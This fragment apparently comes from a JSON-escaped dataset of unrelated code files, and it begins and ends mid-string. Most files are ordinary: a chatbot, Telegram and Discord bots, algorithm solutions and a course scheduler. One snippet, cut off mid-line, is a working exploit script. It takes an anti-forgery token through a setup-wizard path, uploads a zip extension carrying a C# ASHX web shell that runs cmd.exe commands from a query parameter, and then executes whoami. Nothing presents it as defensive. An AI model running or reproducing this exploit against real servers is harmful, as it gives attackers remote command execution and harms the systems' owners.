\u043d\u0435\u0443\u0441\u043f\u0435\u0432\u0430\u044e\u0449\u0438\u0445\nfor st in students:  # \u0432\u044b\u0432\u043e\u0434 \u043d\u0435\u0443\u0441\u043f\u0435\u0432\u0430\u044e\u0449\u0438\u0445\n    for val in st.progress:\n        if val < 3:  # \u0435\u0441\u0442\u044c \u043f\u043b\u043e\u0445\u0430\u044f \u043e\u0446\u0435\u043d\u043a\u0430\n            print(st)  # \u0432\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0430 \u0441 \u043f\u043b\u043e\u0445\u043e\u0439 \u043e\u0446\u0435\u043d\u043a\u043e\u0439\n            n += 1\n            break\n\nif n == 0:\n    print(\"no matches were found.\")\n",
    "import argparse\nimport base64\nimport re\nimport sys\nimport warnings\nfrom distutils.version import LooseVersion\nimport requests\nimport random\nimport string\nimport zipfile\nimport urllib3\n\nDELETE_STATUS=False\nwarnings.filterwarnings(\"ignore\", category=DeprecationWarning)\nurllib3.disable_warnings()\n\nexploit_header = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n}\n\nGREEN = \"\\033[92m\"\nRESET = \"\\033[0m\"\ndef rand_text_hex(length):\n    return ''.join(random.choice('0123456789abcdef') for _ in range(length))\ndef rand_text_alpha_lower(length):\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))\ndef rand_text_alpha(length):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(length))\n\nplugin_guid = '-'.join([rand_text_hex(a) for a in [8, 4, 4, 4, 12]])\npayload_ashx = f\"{rand_text_alpha_lower(8)}.ashx\"\npayload_handler_class = rand_text_alpha(8)\npayload_psi_var = rand_text_alpha(8)\nsession = requests.Session()\n\ndef GetAntiForgeryToken(url, username, password):\n    try:\n        ##\u5982\u679c\u662f\u6b63\u7248\u7684\u8bdd\uff0c\u5219\u4e0d\u9700\u8981SetupWizard.aspx/\n        resp = session.get(url=url + \"/SetupWizard.aspx/Administration\", auth=(username, password), verify=False, headers=exploit_header, proxies=proxy)\n        antiForgeryToken = re.search(r'\"antiForgeryToken\"\\s*:\\s*\"([a-zA-Z0-9+/=]+)\"', resp.text).group(1)\n        return antiForgeryToken\n    except:\n        return None\n\ndef CreateExtension():\n    payload_data = f'''<% @ WebHandler Language=\"C#\" Class=\"{payload_handler_class}\" %>\nusing System;\nusing System.Web;\nusing System.Diagnostics;\npublic class {payload_handler_class} : IHttpHandler\n{{\n    public void ProcessRequest(HttpContext ctx)\n    {{\n        string command = ctx.Request.QueryString[\"cmd\"];\n        if (!string.IsNullOrEmpty(command))\n        {{\n            ExecuteCommand(command, ctx);\n        }}\n        else\n        {{\n            ctx.Response.ContentType = \"text/plain\";\n        }}\n    }}\n    private void ExecuteCommand(string cmd, HttpContext ctx)\n    {{\n        ProcessStartInfo {payload_psi_var} = new ProcessStartInfo();\n        {payload_psi_var}.FileName = \"cmd.exe\";\n        {payload_psi_var}.Arguments = $\"/c {{cmd}}\";\n        {payload_psi_var}.RedirectStandardOutput = true;\n        {payload_psi_var}.UseShellExecute = false;\n        using (Process process = new Process())\n        {{\n            process.StartInfo = {payload_psi_var};\n            process.Start();\n            string output = process.StandardOutput.ReadToEnd();\n            process.WaitForExit();\n            ctx.Response.ContentType = \"text/plain\";\n            ctx.Response.Write(output);\n        }}\n    }}\n    public bool IsReusable {{ get {{ return true; }} }}\n}}'''\n    manifest_data = f'''<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<ExtensionManifest>\n  <Version>1</Version>\n  <Name>{rand_text_alpha_lower(8)}</Name>\n  <Author>{rand_text_alpha_lower(8)}</Author>\n  <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>\n  <LoadMessage>null</LoadMessage>\n  <Components>\n    <WebServiceReference SourceFile=\"{payload_ashx}\"/>\n  </Components>\n</ExtensionManifest>'''\n    zip_resources = zipfile.ZipFile(\"resources.zip\", 'w')\n    zip_resources.writestr(f\"{plugin_guid}/Manifest.xml\", manifest_data)\n    zip_resources.writestr(f\"{plugin_guid}/{payload_ashx}\", payload_data)\n    zip_resources.close()\n\ndef UploadExtension(url, anti_forgery_token):\n    with open(\"resources.zip\", \"rb\") as f:\n        zip_data = f.read()\n    zip_data_base64 = base64.b64encode(zip_data).decode()\n    headers = {\n        \"X-Anti-Forgery-Token\": anti_forgery_token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n    }\n    url = url + \"/Services/ExtensionService.ashx/InstallExtension\"\n    session.cookies.update({\"settings\": \"%7B%22collapsedPanelMap%22%3A%7B%22Inactive%22%3Atrue%7D%7D\"})\n    try:\n        response = session.post(url=url, data=f\"[\\\"{zip_data_base64}\\\"]\", headers=headers, verify=False, proxies=proxy)\n        if response.status_code == 200:\n            print(f\"[+] The malicious extension was uploaded successfully, with the ID: {plugin_guid}\")\n        else:\n            print(\"[-] Malicious extension upload failed, please check the network and try again or try to exploit manually\")\n    except Exception as err:\n        print(\"[-] Error in func <UploadExtension>, error message: \" + str(err))\n\ndef ExecuteCommand(url):\n\n        resp = session.get(url=url + f\"/App_Extensions/{plugin_guid}/{payload_ashx}\", headers=exploit_header, verify=False, proxies=proxy)\n        if resp.status_code == 200:\n            print(f\"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}\")\n            print(\"[+] \u6267\u884c\u56fa\u5b9a\u547d\u4ee4 whoami\")\n            cmd = 'whoami'\n            resp = session.get(url=url + f\"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}\", headers=exploit_",
    "\nfrom typing import Optional\nfrom collections import deque\n\"\"\"\n\ndefinition of binary tree node.\nclass Node:\n    def _init_(self,val):\n        self.data = val\n        self.left = None\n        self.right = None\n\"\"\"\n\nclass Solution:\n    def pairsViolatingBST(self, n : int, root : Optional['Node']) -> int:\n        # code here\n        s = []\n        def inorder(node):\n            if not node:\n                return\n            inorder(node.left)\n            s.append(node.data)\n            inorder(node.right)\n        inorder(root)\n        \n        ans = 0\n        def mergesort(arr):\n            nonlocal ans\n            if len(arr) <= 1:\n                return arr\n                \n            mi = len(arr)//2\n            a = mergesort(arr[:mi])\n            b = mergesort(arr[mi:])\n            i, j, ret = 0, 0, []\n            while i < len(a) and j < len(b):\n                if a[i] <= b[j]:\n                    ret.append(a[i])\n                    i += 1\n                else:\n                    ans += len(a)-i\n                    ret.append(b[j])\n                    j += 1\n            if i < len(a):\n                ret.extend(a[i:])\n            if j < len(b):\n                ret.extend(b[j:])\n            return ret\n        mergesort(s)\n        return ans\n        \n\n\n\n#{ \n # Driver Code Starts\n\nclass Node:\n    def __init__(self,val):\n        self.data=val\n        self.right=None\n        self.left=None\n\n# Function to Build Tree\ndef buildTree(s):\n    #Corner Case\n    if(len(s)==0 or s[0]==\"N\"):\n        return None\n\n    # Creating list of strings from input\n    # string after spliting by space\n    ip=list(map(str,s.split()))\n\n    # Create the root of the tree\n    root=Node(int(ip[0]))\n    size=0\n    q=deque()\n\n    # Push the root to the queue\n    q.append(root)\n    size=size+1\n\n    # Starting from the second element\n    i=1\n    while(size>0 and i<len(ip)):\n        # Get and remove the front of the queue\n        currNode=q[0]\n        q.popleft()\n        size=size-1\n\n        # Get the current node's value from the string\n        currVal=ip[i]\n\n        # If the left child is not null\n        if(currVal!=\"N\"):\n\n            # Create the left child for the current node\n            currNode.left=Node(int(currVal))\n\n            # Push it to the queue\n            q.append(currNode.left)\n            size=size+1\n        # For the right child\n        i=i+1\n        if(i>=len(ip)):\n            break\n        currVal=ip[i]\n\n        # If the right child is not null\n        if(currVal!=\"N\"):\n\n            # Create the right child for the current node\n            currNode.right=Node(int(currVal))\n\n            # Push it to the queue\n            q.append(currNode.right)\n            size=size+1\n        i=i+1\n    return root\n\ndef inputTree():\n    treeString=input().strip()\n    root = buildTree(treeString)\n    return root\ndef inorder(root):\n    if (root == None):\n       return\n    inorder(root.left);\n    print(root.data,end=\" \")\n    inorder(root.right)\n\nif __name__==\"__main__\":\n    t = int(input())\n    for _ in range(t):\n        \n        n = int(input())\n        \n        \n        root = inputTree();\n        \n        obj = Solution()\n        res = obj.pairsViolatingBST(n, root)\n        \n        print(res)\n        \n\n# } Driver Code Ends",
    "from dotenv import load_dotenv\nimport os\n\nimport streamlit as st\n\nfrom langchain.chains import ConversationChain\nfrom langchain.chains.conversation.memory import ConversationBufferWindowMemory\nfrom langchain_groq import ChatGroq\n\n\ndef main():\n    \"\"\"\n    This function is the main entry point of the application. It sets up the Groq client, the Streamlit interface,\n    and handles the chat interaction.\n    \"\"\"\n\n    # Get Groq API key\n    load_dotenv()  # Load environment variables from .env file\n    groq_api_key = os.getenv(\"GROQ_API_KEY\")\n\n    # Display the Groq logo\n    spacer, col = st.columns([5, 1])\n    with col:\n        st.image('groqcloud_darkmode.png')\n\n    # The title and greeting message of the Streamlit application\n    st.title(\"Chat with Groq!\")\n    st.write(\n        \"Hello! I'm your friendly Groq chatbot. I can help answer your questions, provide information, or just chat. \"\n        \"I'm also super fast! Let's start our conversation!\")\n\n    # Add customization options to the sidebar\n    st.sidebar.title('Customization')\n    model = st.sidebar.selectbox(\n        'Choose a model',\n        ['mixtral-8x7b-32768', 'llama2-70b-4096']\n    )\n    conversational_memory_length = st.sidebar.slider('Conversational memory length:', 1, 10, value=5)\n\n    memory = ConversationBufferWindowMemory(k=conversational_memory_length)\n\n    user_question = st.text_input(\"Ask a question:\")\n\n    # session state variable\n    if 'chat_history' not in st.session_state:\n        st.session_state.chat_history = []\n    else:\n        for message in st.session_state.chat_history:\n            memory.save_context({'input': message['human']}, {'output': message['AI']})\n\n    # Initialize Groq Langchain chat object and conversation\n    groq_chat = ChatGroq(\n        groq_api_key=groq_api_key,\n        model_name=model\n    )\n\n    conversation = ConversationChain(\n        llm=groq_chat,\n        memory=memory\n    )\n\n    # If the user has asked a question,\n    if user_question:\n        # The chatbot's answer is generated by sending the full prompt to the Groq API.\n        response = conversation(user_question)\n        message = {'human': user_question, 'AI': response['response']}\n        st.session_state.chat_history.append(message)\n        st.write(\"Chatbot:\", response['response'])\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from binascii import hexlify\n\n\nclass CdcOffset:\n    \"\"\"Deserialized version of a CDC offset\"\"\"\n\n    def __init__(self, data):\n        assert data is not None, \"Expected an offset, but got None\"\n        assert len(data) == 24, f\"Expected an offset with 24 bytes got {len(data)}\"\n        self._data = data\n\n    def __str__(self):\n        return hexlify(self._data).decode(\"utf-8\")\n\n    def __repr__(self):\n        return self.__str__()\n\n\nclass CdcRecord:\n    \"\"\"Deserialized version of a CDC record\"\"\"\n\n    def __init__(self, data):\n        assert data is not None, \"Expected a record, but got None\"\n        assert len(data) >= 7, \"Expected a record with at least 7 aux columns\"\n        self.offset = data[0]\n        self.partition_id = data[1]\n        self.record_type = data[2]\n        self.table = data[3]\n        self.tx_id = data[4]\n        self.tx_partitions = data[5]\n        self.internal_id = data[6]\n        self.data = data[7:]\n\n    def _data_equals(self, other):\n        # DB-65478: projected values are not properly nullable\n        def defaulted_equals(a, b):\n            \"\"\"Return true if a and b are equal, or if one is None and the other is the default value for its type\"\"\"\n            return a == b or (a is None and b == type(b)()) or (a == type(a)() and b is None)\n\n        return len(self.data) == len(other.data) and all(defaulted_equals(a, b) for a, b in zip(self.data, other.data))\n\n    def __eq__(self, other):\n        return (\n            self.offset == other.offset\n            and self.partition_id == other.partition_id\n            and self.record_type == other.record_type\n            and self.table == other.table\n            and self.tx_id == other.tx_id\n            and self.tx_partitions == other.tx_partitions\n            and self.internal_id == other.internal_id\n            and self._data_equals(other)\n        )\n\n    def __str__(self):\n        return (\n            f\"Record(\"\n            f\"offset={CdcOffset(self.offset)}, partition_id={self.partition_id}, record_type={self.record_type}, \"\n            f\"table={self.table}, tx_id={hexlify(self.tx_id)!r}, tx_partitions={self.tx_partitions}, \"\n            f\"internal_id={self.internal_id} data={self.data})\"\n        )\n\n    def __repr__(self):\n        return self.__str__()\n",
    "import asyncpg\nfrom telebot.async_telebot import AsyncTeleBot\nfrom telebot.types import Message\n\nfrom autostudent.repository.course import get_courses_page\nfrom autostudent.repository.subscription import get_chat_subscriptions\nfrom autostudent.tg_bot.markups import subscription_markup\n\n\nasync def subscription_handler(\n    message: Message,\n    bot: AsyncTeleBot,\n    pool: asyncpg.Pool,\n):\n    courses_to_request = bot.settings.course_page_size + 1\n    async with pool.acquire() as conn:  # type: asyncpg.Connection\n        courses = await get_courses_page(conn, page_size=courses_to_request)\n        current_subscriptions = await get_chat_subscriptions(conn, message.chat.id)\n\n    courses_found = len(courses)\n    if courses:\n        courses.pop()\n\n    await bot.reply_to(\n        message,\n        \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0438 \u043d\u0430 \u0447\u0430\u0442\",\n        reply_markup=subscription_markup(\n            courses=courses,\n            current_subscriptions=current_subscriptions,\n            current_page=0,\n            has_more=(courses_found == courses_to_request),\n            subscription_icons=bot.settings.subscription_icons,\n        )\n    )\n",
    "import discord\nimport random\nimport datetime\nfrom discord.ext import commands\n\nintents = discord.Intents.all()\nbot = commands.Bot(command_prefix=\"!\", intents=intents)\n\nadmin_id = #\uc5b4\ub4dc\ubbfc \uc544\uc774\ub514\nTOKEN = \"\" #\ubd07 \ud1a0\ud070\n\n@bot.event\nasync def on_ready():\n    print(f'We have logged in as {bot.user}')\n\n@bot.slash_command(name='nuke', description='\ucc44\ub110\uc744 \uc7ac\uc0dd\uc131\ud569\ub2c8\ub2e4.')\nasync def nuke(ctx):\n    if ctx.guild.get_role(admin_id) in ctx.author.roles:\n        aposition = ctx.channel.position\n        new = await ctx.channel.clone()\n        await ctx.channel.delete()\n        await new.edit(position=aposition)\n        embed = discord.Embed(title='Nuked', description='Channel Nuked.', color=discord.Color.red())\n        await new.send(embed=embed)\n    else:\n        embed = discord.Embed(title=\"\uad8c\ud55c \uc5c6\uc74c\", description=\"\uad00\ub9ac\uc790\ub9cc \uc0ac\uc6a9 \uac00\ub2a5\ud569\ub2c8\ub2e4.\", color=discord.Color.red())\n        await ctx.respond(embed=embed)\n\n@bot.slash_command(name='\uc778\uc99d', description='\uc544\ub798 \ubc84\ud2bc\uc744 \ub20c\ub7ec \uc5ed\ud560\uc744 \uc9c0\uae09\ud569\ub2c8\ub2e4.')\nasync def btrole(ctx):\n    embed = discord.Embed(title=\"\uc778\uc99d\ud558\uae30\", description=\"\uc544\ub798 \ubc84\ud2bc\uc744 \ub204\ub974\uba74 \uc5ed\ud560\uc774 \uc9c0\uae09\ub429\ub2c8\ub2e4\", color=discord.Color.green())\n    await ctx.respond(embed=embed, view=RoleButton(ctx))\n\nclass RoleButton(discord.ui.View):\n    def __init__(self, ctx):\n        super().__init__(timeout=None)\n        self.ctx = ctx\n\n    @discord.ui.button(label=\"\uc778\uc99d\ud558\uae30\", style=discord.ButtonStyle.green, custom_id=\"verification_button\")\n    async def charge(self, button: discord.ui.Button, interaction: discord.Interaction):\n        member = interaction.guild.get_member(interaction.user.id)\n        roles = discord.utils.get(interaction.guild.roles, name=\"\uc778\uc99d\u2705\")\n        await member.add_roles(roles)\n        await interaction.response.send_message(\"\uc778\uc99d\uc774 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\", ephemeral=True)\n\nuser_balances = {}\nuser_last_reward_date = {}\n\nclass BaccaratGame:\n    def __init__(self, bet_amount):\n        self.bet_amount = bet_amount\n        self.player_cards = []\n        self.banker_cards = []\n\n    def deal_cards(self):\n        deck = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'] * 4\n        deck = list(deck)\n        random.shuffle(deck)\n        self.player_cards = [deck.pop(), deck.pop()]\n        self.banker_cards = [deck.pop(), deck.pop()]\n\n    def calculate_total(self, cards):\n        total = 0\n        for card in cards:\n            if card.isdigit():\n                total += int(card)\n            elif card in ['J', 'Q', 'K']:\n                total += 10\n            else:\n                total += 1\n        return total\n\n    def calculate_result(self, choice):\n        player_total = self.calculate_total(self.player_cards)\n        banker_total = self.calculate_total(self.banker_cards)\n        if player_total > banker_total:\n            if choice == '\ud50c\ub808\uc774\uc5b4':\n                return \"\ud50c\ub808\uc774\uc5b4\"\n            else:\n                return \"\ubc45\ucee4\"\n        elif player_total < banker_total:\n            if choice == '\ubc45\ucee4':\n                return \"\ubc45\ucee4\"\n            else:\n                return \"\ud50c\ub808\uc774\uc5b4\"\n        else:\n            return \"\ubb34\uc2b9\ubd80\"\n\n@bot.slash_command(name='\ubc14\uce74\ub77c')\nasync def baccarat(ctx, bet_amount: int, choice: str):\n    if bet_amount <= 0:\n        await ctx.channel.trigger_typing()  \n        embed = discord.Embed(title=\"\uc624\ub958\",description=\"\ubca0\ud305 \uae08\uc561\uc740 0\ubcf4\ub2e4 \ucee4\uc57c \ud569\ub2c8\ub2e4.\", color=discord.Color.red())\n        await ctx.respond(embed=embed)\n        return\n\n    if choice not in ['\ud50c\ub808\uc774\uc5b4', '\ubc45\ucee4', '\ubb34\uc2b9\ubd80']:\n        await ctx.channel.trigger_typing()  \n        embed = discord.Embed(title=\"\uc624\ub958\",description=\"\uc62c\ubc14\ub978 \uc120\ud0dd\uc744 \ud574\uc8fc\uc138\uc694: '\ud50c\ub808\uc774\uc5b4', '\ubc45\ucee4', '\ubb34\uc2b9\ubd80'\", color=discord.Color.red())\n        await ctx.respond(embed=embed)\n        return\n\n    if ctx.author.id not in user_balances:\n        user_balances[ctx.author.id] = 0\n\n    if user_balances[ctx.author.id] < bet_amount:\n        await ctx.channel.trigger_typing()  \n        embed = discord.Embed(title=\"\uc624\ub958\",description=\"\uc794\uc561\uc774 \ubd80\uc871\ud569\ub2c8\ub2e4.\", color=discord.Color.red())\n        await ctx.respond(embed=embed)\n        return\n\n    game = BaccaratGame(bet_amount)\n    game.deal_cards()\n    result = game.calculate_result(choice)\n\n    winnings = 0\n    if result == choice:\n        winnings = bet_amount * 2\n        user_balances[ctx.author.id] += winnings\n    else:\n        user_balances[ctx.author.id] -= bet_amount\n    user_last_reward_date[ctx.author.id] = datetime.date.today()\n\n    await ctx.channel.trigger_typing()  \n    embed = discord.Embed(title=\"\ubc14\uce74\ub77c\",description=f\"\ud50c\ub808\uc774\uc5b4 \uce74\ub4dc: {game.player_cards}\\n\ubc45\ucee4 \uce74\ub4dc: {game.banker_cards}\\n{result}\uc774(\uac00) \ub098\uc654\uc2b5\ub2c8\ub2e4. {'\ubc30\ud305\uae08\uc561\uc758 2\ubc30\uc778 '+str(winnings)+'\uc6d0\uc744(\ub97c) \ud68d\ub4dd\ud558\uc168\uc2b5\ub2c8\ub2e4.' if winnings > 0 else '\uc544\uc27d\uc9c0\ub9cc \ubca0\ud305\uc561\uc744 \uc783\uc5c8\uc2b5\ub2c8\ub2e4.'}\", color=discord.Color.green())\n    await ctx.respond(embed=embed)\n\nranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A']\ncards = [{'rank': rank} for rank in ranks]\n\nclass BlackjackGame:\n    def __init__(self):\n        self.player_hand = []\n        self.dealer_hand = []\n\n    def deal_cards(self):\n        random.shuffle(cards)\n        self.player_hand = [cards.pop(), cards.pop()]\n        self.dealer_hand = [cards.pop(), cards.pop()]\n\n    def hit(self):\n        self.player_hand.append(cards.pop())",
    "template = \"\"\"\nAssistant is a large language model trained by OpenAI.\n\nAssistant is designed to be able to assist with a wide range of tasks, from answering simple questions to providing in-depth explanations and discussions on a wide range of topics. As a language model, Assistant is able to generate human-like text based on the input it receives, allowing it to engage in natural-sounding conversations and provide responses that are coherent and relevant to the topic at hand.\n\nAssistant is constantly learning and improving, and its capabilities are constantly evolving. It is able to process and understand large amounts of text, and can use this knowledge to provide accurate and informative responses to a wide range of questions. Additionally, Assistant is able to generate its own text based on the input it receives, allowing it to engage in discussions and provide explanations and descriptions on a wide range of topics.\n\nOverall, Assistant is a powerful tool that can help with a wide range of tasks and provide valuable insights and information on a wide range of topics. Whether you need help with a specific question or just want to have a conversation about a particular topic, Assistant is here to assist.\n\nTOOLS:\n------\n\nAssistant has access to the following tools:\n\n{tools}\n\nAlways use a tool when asked about the author or his project, please use the following format:\n\n```\nThought: Do I need to use a tool? Yes\nAction: {tool_names}\nAction Input: [input to pass to the tool, should be '{input}' or something similar]\nObservation: [the result of the action]\n```\n\nWhen you have a response to say to the Human, or if you do not need to use a tool, you MUST use the format:\n\n```\nThought: Do I need to use a tool? No\nFinal Answer: [your response here]\n```\n\nPrevious conversation history:\n{chat_history}\n\nNew input: {input}\n{agent_scratchpad}\n\"\"\"",
    "import json\nimport csv\nfrom glob import glob\n\ndef grab_all_contexts() -> dict:\n    \"\"\"\n    Grab all contexts from the context directory and return them as a dictionary.\n\n    Returns:\n        dict: A dictionary containing the contexts, where the keys are the file names and the values are the context contents.\n    \"\"\"\n    contexts = {}\n    for cxt in glob('context/*.cxt'):\n        with open(cxt, 'r') as json_file:\n            context = json.load(json_file)\n        file_name = cxt.split('/')[-1].split('.')[0]\n        contexts[file_name] = context\n    \n    if not contexts:\n        print('No contexts found. Please create a {name}.cxt file in the context directory.')\n        print('Input the values you get from https://developer.planning.center/, follow the same structure as the example context')\n        exit(1)\n    \n    return contexts\n\ndef pick_context() -> dict:\n    \"\"\"\n    Prompts the user to choose a context from a list of available contexts.\n\n    Returns:\n        dict: The selected context.\n    \"\"\"\n    contexts = grab_all_contexts()\n    print('Choose a context to use:')\n    for i, context in enumerate(contexts, 1):\n        print(f'{i}. {context}')\n    choice = input('Enter the number of the context you want to use: ')\n    try:\n        return contexts[list(contexts.keys())[int(choice)-1]]\n    except:\n        print('Invalid choice. Please enter a number from the list.')\n        return pick_context()\n    \ndef get_blockout_info() -> dict:\n    \"\"\"\n    Retrieves blockout information from a JSON file.\n\n    Returns:\n        A dictionary containing the blockout information.\n    \"\"\"\n    with open ('input/blockouts.json', 'r') as json_file:\n        blockouts = json.load(json_file)\n    return blockouts\n\ndef grab_all_names() -> dict:\n    \"\"\"\n    Grab all names from CSV files in the 'input' directory and return them as a dictionary.\n\n    Returns:\n        dict: A dictionary containing the names from each CSV file, where the keys are the file names and the values are the data from the CSV files.\n    \"\"\"\n    name_files = {}\n    # navigate to ./names and grab each csv file\n    for name_file in glob('input/*.csv'):\n        with open(name_file, 'r') as csv_file:\n            file = csv_file.read()\n        # convert file to a dictionary\n        csv_dict = csv.DictReader(file.splitlines())\n        data = [row for row in csv_dict]\n        # get file name\n        file_name = name_file.split('/')[-1].split('.')[0]\n        name_files[file_name] = data\n    \n    if not name_files:\n        print('No names found. Please create a {name}.csv file in the names directory.')\n        print('Input the values you get from https://developer.planning.center/, follow the same structure as the example name')\n        exit(1)\n    \n    return name_files\n\ndef pick_names() -> str:\n    \"\"\"\n    Prompts the user to choose a names file and returns the selected file.\n\n    Returns:\n        str: The selected names file.\n\n    \"\"\"\n    names = grab_all_names()\n    print('Choose a names file to use:')\n    for i, name in enumerate(names):\n        print(f'{i+1}. {name}')\n    choice = input('Enter the number of the names file you want to use: ')\n    try:\n        return names[list(names.keys())[int(choice)-1]]\n    except:\n        print('Invalid choice. Please enter a number from the list.')\n        return pick_names()\n\n\nif __name__ == '__main__':\n    print(pick_context())\n    print(pick_names())\n    print(get_blockout_info())",
    "import  random\r\n\r\ndef generate_random_ip():\r\n    \"\"\"Function para makapag generate ng random ip address.\"\"\"\r\n    return f\"192.168.1.{random.randint(0, 20)}\"\r\n\r\ndef check_firewall_rules(ip, rules):\r\n    \"\"\"Function if yung ip is match dun sa firewall rules natin.\"\"\"\r\n    for rule_ip, action in rules.items():\r\n        if ip == rule_ip:\r\n            return action\r\n    return \"allow\"  # Default action if walang mag mamatch\r\n\r\ndef main():\r\n    # Malicious firewall rules (key: IP address, value: action)\r\n    firewall_rules = {\r\n        \"192.168.1.1\": \"block\",\r\n        \"192.168.1.4\": \"block\",\r\n        \"192.168.1.9\": \"block\",\r\n        \"192.168.1.13\": \"block\",\r\n        \"192.168.1.16\": \"block\",\r\n        \"192.168.1.19\": \"block\"\r\n    }\r\n\r\n      # for network test ito!\r\n    for _ in range(20):\r\n     ip_address = generate_random_ip()\r\n     action = check_firewall_rules(ip_address, firewall_rules)\r\n     random_number = random.randint(0, 9999)\r\n     print(f\"IP: {ip_address}, Action: {action}, Random: {random_number}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "#Check if any two lists overlap by checking if any value falls between another list or if one of the values are equal\ndef isOverlapping(lst1, lst2):\n    if (lst2[0] > lst1[0] and lst2[0] < lst1[-1]) or (lst1[0] > lst2[0] and lst1[0] < lst2[-1]):\n\n        return True\n\n    elif (lst1[0] == lst2[0] or lst1[-1] == lst2[-1]):\n\n        return True\n\n    return False\n\n#Convert time to flaot, i.e., \"12:30-14:00\" --> [12.5,14.0]. This will be used with the overlapping function\ndef TimeToFloat(time):\n    #Convert the string into a list\n    time = time.split(\"-\")\n\n    #Loop through the list and divide the last 2 numbers by 60. Ex: if the time ends in 30, like 12:30, you'll get 12.5\n    for index in range(len(time)):\n        time[index] = float(time[index][:-3]) + float(time[index][-2:]) / 60\n\n    return time\n\n#Check if two courses can be registered together. This utilizes the overlapping and time to float conversion functions\ndef isEligible(firstCourse, secondCourse):\n    #Loop through the timings of each course\n    for firstCourseTiming in range(2, len(firstCourse), 2):\n        for secondCourseTiming in range(2, len(secondCourse), 2):\n            #Get the course time and the course day\n            courseOneTime = TimeToFloat(firstCourse[firstCourseTiming])\n            courseTwoTime = TimeToFloat(secondCourse[secondCourseTiming])\n\n            courseOneDay = firstCourse[firstCourseTiming - 1]\n            courseTwoDay = secondCourse[secondCourseTiming - 1]\n            #If the course days are the same and their timings overlap, return false\n            if courseOneDay == courseTwoDay and isOverlapping(courseOneTime, courseTwoTime):\n                return False\n    return True\n\n#Check if a schedule is eligible by checking if every course in said schedule doesn't overlap with another course\ndef isEligibleSchedule(schedule):\n    for firstCourse in range(len(schedule)):\n        for consequentCourse in schedule[firstCourse+1:]:\n            if isEligible(schedule[firstCourse],consequentCourse) == False:\n                return False\n    return True\n\n#Display the course in a formal way.\n#Ex: ['course1,'monday','12:00-15:00','wednesday','9:00-12:00'] --> course1: monday 12:00-15:00, wednesday 9:00-12:00\ndef displayCourse(course):\n    #loop through the course information\n    for info in range(len(course)):\n        #if it's the first item (course name), add :\n        if info == 0:\n            print(course[info] + \": \", end='')\n        #If not, check if it's the course day (odd numbers) and display it with the timing (the item next).\n        elif info % 2 != 0:\n            print(course[info], course[info + 1], end='')\n        #Don't add a comma to the last item\n            if info != len(course) - 2:\n                print(\",\", end='')\n\n#Display the schedule in a formal way.\n#Loop through the courses and use the displayCourse function\ndef displaySchedule(schedule):\n\n    print(\"Missing days: \" + getMissingDays(schedule))\n    print(\"Total hours of freetime: \" + str(totalFreeTimePerSchedule(schedule)) + \" hours\")\n    print(\"Average starting time: \" + singleFloatToTime(averageStartTimePerSchedule(schedule)))\n    print(\"Average finishing time: \" + singleFloatToTime(averageFinishTimePerSchedule(schedule)))\n    print()\n\n    for course in schedule:\n        displayCourse(course)\n        print()\n\n#Get any missing days in a specific schedule. This is a filter function to determine if any schedule can lack any day\ndef getMissingDays(schedule):\n    allowedDays = {'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'}\n    scheduledDays = set()\n\n    for course in schedule:\n        for day in range(1, len(course), 2):\n            scheduledDays.add(course[day])\n\n    missingDays = list(allowedDays - scheduledDays)\n\n    if len(missingDays) == 0:\n        return 'No missing days'\n\n    elif len(missingDays) == 1:\n        return missingDays[0]\n\n    else:\n        missingDaysDisplay = ','.join(missingDays[:-1]) + ' and ' + missingDays[-1]\n\n    return missingDaysDisplay\n\n\n#Get the course name from the file. Ex: Get the \"Information Structures\" from \"Information Structures(BCS206Lec3)\"\ndef courseName(string):\n    return string[:string.find(\"(\")]\n\n#Convert the course, as a string, to a list.\ndef courseStringToCourseList(course):\n    course = course.split(',')\n\n    return course\n\n#Get the class timings for each day\ndef timePerEachDay(schedule):\n    timePerDay = {}\n\n    for course in schedule:\n        for day in range(1, len(course), 2):\n\n            if course[day] not in timePerDay:\n                timePerDay[course[day]] = []\n\n    for course2 in schedule:\n        for day2 in range(1, len(course2), 2):\n            timePerDay[course2[day2]].append(TimeToFloat(course2[day2 + 1]))\n\n    return timePerDay\n\n#Get the difference between two timings, that is, the time between two classes\ndef timeDifference(timeList):\n    timeList.sort()\n\n    difference = 0\n\n    for time in range(len(timeList) - 1):\n        difference += timeList[time + 1][0] - timeList[time][1]\n\n    retu",
